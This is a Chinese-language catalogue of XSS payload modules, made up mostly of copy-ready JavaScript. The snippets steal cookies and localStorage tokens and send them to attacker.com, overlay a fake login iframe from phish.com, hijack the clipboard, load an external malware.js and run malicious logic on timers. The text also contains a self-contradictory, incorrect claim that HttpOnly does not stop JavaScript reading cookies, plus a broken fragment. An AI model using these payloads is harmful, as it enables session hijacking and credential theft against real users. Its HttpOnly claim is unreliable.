1. Cookie 窃取 / 获取 Cookie（最常见，占列表一半以上）

核心目的：利用 XSS 在受害者浏览器中读取当前域的 document.cookie，并通过各种方式外发到攻击者控制的服务器。

// 经典低检测外发方式
new Image().src = 'https://attacker.com/log?c=' + encodeURIComponent(document.cookie);

// 或使用 fetch（POST 方式更隐蔽）
fetch('https://attacker.com', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});

热度极高，几乎是所有 XSS 平台最基础、最常被复制的模块。即使设置了 HttpOnly 的 cookie 也无法阻止 JS 读取（HttpOnly 只防 document.cookie 访问）。

2. LocalStorage / Token 窃取

针对现代前端应用，JWT、Session Token、用户偏好等常存储在 localStorage / sessionStorage 中，XSS 可直接读取并外发。

const tokens = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  tokens[key] = localStorage.getItem(key);
}
fetch('https://attacker.com', {
  method: 'POST',
  body: JSON.stringify(tokens)
});

常与 Cookie 窃取结合使用，因为 HttpOnly Cookie 无法读取，但 Storage 完全暴露在 JS 上下文中。

3. 钓鱼 / 伪造页面 / 跳转钓鱼

利用 XSS 修改 DOM 内容、弹出伪造登录框、定时跳转到克隆页面，或伪造系统提示（如证书错误、Flash 升级）来诱导用户输入凭证。

// 简单覆盖页面（概念示例）
document.body.innerHTML = '<h1>登录已过期，请重新登录</h1><iframe src="https://phish.com/login"></iframe>';

// 定时检测 + 跳转（概念示例）
setInterval(() => {
  if (/* 某些条件 */) location.href = 'https://phish.com';
}, 600000); // 每10分钟

4. 自动复制 / 剪贴板操作

在用户交互后自动将恶意链接、payload 或钓鱼地址写入剪贴板，诱导用户粘贴到聊天框、搜索栏等位置执行。

// 需要用户交互触发
navigator.clipboard.writeText('https://phish.com/login?ref=' + encodeURIComponent(location.href))
  .then(() => console.log('已复制'))
  .catch(err => console.error('复制失败', err));

5. 动态加载外部 JS / 脚本注入

s.src = 'https://attacker.com/malware.js';

6. 定时 / 延迟执行

利用 setTimeout / setInterval 实现延迟触发、周期性行为（如反复窃取 cookie、定时弹窗、延迟跳转）。

// 每分钟执行一次
setInterval(() => {
  // 恶意逻辑
}, 60000);
